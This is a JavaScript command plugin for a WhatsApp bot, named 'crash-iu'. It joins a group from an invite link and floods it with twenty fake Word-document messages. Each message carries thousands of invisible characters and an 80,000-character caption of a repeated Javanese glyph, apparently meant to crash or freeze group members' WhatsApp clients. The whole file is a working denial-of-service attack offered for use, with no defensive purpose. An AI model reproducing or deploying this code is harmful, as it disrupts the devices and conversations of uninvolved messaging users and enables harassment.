let handler = async (m, { conn, text }) => {
  const descripcionBase = 'ꦾ';
  const descripcionFinal = (descripcionBase.repeat(80000)).trim();

  // Validación
  if (!text) return m.reply('😿 Usa: .crash-iu <enlace del grupo>');

  let match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
  if (!match) return m.reply('😡 Enlace inválido.');

  const inviteCode = match[1];
  let groupId;

  try {
    groupId = await conn.groupAcceptInvite(inviteCode);
  } catch (e) {
    groupId = `120363${inviteCode}@g.us`;
  }

  // Crear documento falso como buffer vacío
  const fakeDoc = Buffer.from('\u200E'.repeat(10000)); // invisible LRM characters

  const fileName = '🔥𝗧𝗢𝗕𝗜🔥'.repeat(1); // nombre repetido 2 veces

  for (let i = 0; i < 20; i++) {
    await conn.sendMessage(groupId, {
      document: fakeDoc,
      fileName,
      mimetype: 'application/msword', // 📄 se muestra como documento Word
      caption: descripcionFinal
    }, { ephemeralExpiration: 86400 }); // opcional: mensaje efímero por 1 día
  }

  await conn.reply(m.chat, '✅ Archivos enviados al grupo.', m);
};

handler.help = ['crash-iu <enlace del grupo>'];
handler.tags = ['tools', 'grupo'];
handler.command = ['crash-iu'];

export default handler;